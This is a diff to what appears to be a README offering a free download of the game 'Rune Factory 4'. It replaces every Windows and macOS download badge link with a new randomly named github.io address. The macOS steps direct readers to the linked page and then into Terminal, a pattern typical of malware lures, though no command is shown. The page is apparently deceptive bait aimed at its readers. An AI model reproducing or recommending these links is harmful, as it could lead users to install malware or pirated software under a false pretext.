@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Rune%20Factory%204-F9A825?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
+[![Download](https://img.shields.io/badge/⬇_Download_Rune%20Factory%204-F9A825?style=for-the-badge&logo=github)](https://nrotnjxfyuta.github.io/win-setup/)
 
 </div>
 
@@ -61,9 +61,9 @@ A beloved fantasy farming RPG where you manage a farm, forge relationships with 
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://etgysfcihddy.github.io/windows-dl/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://nrotnjxfyuta.github.io/win-setup/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://etgysfcihddy.github.io/macos-dl/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://nrotnjxfyuta.github.io/mac-setup/)
 
 </div>
 
@@ -102,7 +102,7 @@ A beloved fantasy farming RPG where you manage a farm, forge relationships with 
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://etgysfcihddy.github.io/macos-dl/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://nrotnjxfyuta.github.io/mac-setup/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
